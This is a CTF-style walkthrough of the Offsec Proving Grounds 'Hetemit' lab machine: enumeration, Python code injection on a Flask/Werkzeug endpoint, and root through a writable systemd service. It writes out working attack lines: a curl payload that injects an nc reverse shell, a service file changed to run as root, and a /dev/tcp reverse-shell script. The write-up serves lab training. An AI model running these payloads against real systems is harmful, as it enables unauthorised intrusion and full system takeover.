---
title: "Proving grounds Practice: Hetemit"
layout: post
date: 2024-03-27 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- File Write
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
```

## 21/tcp    open  ftp         vsftpd 3.0.3

anonymous login successfull
nothing...

## 139/tcp   open  netbios-ssn Samba smbd 4.6.2
## 445/tcp   open  netbios-ssn Samba smbd 4.6.2

```sh
naveenj@hackerspace:[06:54]~/proving_grounds/Hetemit$ smbclient -L //192.168.201.117/ -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Cmeeks          Disk      cmeeks Files
	IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

## 50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)

- http://192.168.201.117:50000/verify

```sh
naveenj@hackerspace:[06:49]~/proving_grounds/Hetemit$ curl -X POST --data "code=4*4" http://192.168.201.117:50000/verify
16
```
Vulnerable to command injection

```sh
#inject reverse shell
naveenj@hackerspace:[06:49]~/proving_grounds/Hetemit$ curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.218 80')" http://192.168.201.117:50000/verify
# netcat listening
naveenj@hackerspace:[06:49]~/proving_grounds/Hetemit$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.218] from (UNKNOWN) [192.168.201.117] 50652
which python
id
uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")' 
[cmeeks@hetemit restjson_hetemit]$ 
```

Initial foothold obtained.

## Privilege Escalation

### Linpeas Enumeration
```sh
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/pythonapp.service
/etc/systemd/system/multi-user.target.wants/pythonapp.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/railsapp.service could be executing some relative path
/etc/systemd/system/pythonapp.service

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

/usr/sbin/suexec = cap_setgid,cap_setuid+ep

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
You have write privileges over /etc/systemd/system/pythonapp.service
```

### Exploitation

Writing shell to file `/etc/systemd/system/pythonapp.service`.

**Original content**

```sh
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**Modified Content**

```sh
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/restjson_hetemit/run.sh #add reverse shell in the bash script
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**run.sh**

```sh
#!bin/bash

bash -c 'sh -i >& /dev/tcp/192.168.45.218/22 0>&1'
```

```sh
naveenj@hackerspace:[07:28]~/proving_grounds/Hetemit$ nc -lvnp 22
listening on [any] 22 ...
connect to [192.168.45.218] from (UNKNOWN) [192.168.201.117] 39016
sh: cannot set terminal process group (989): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4# 
```

**Root Obtained**

## References

- https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
- https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).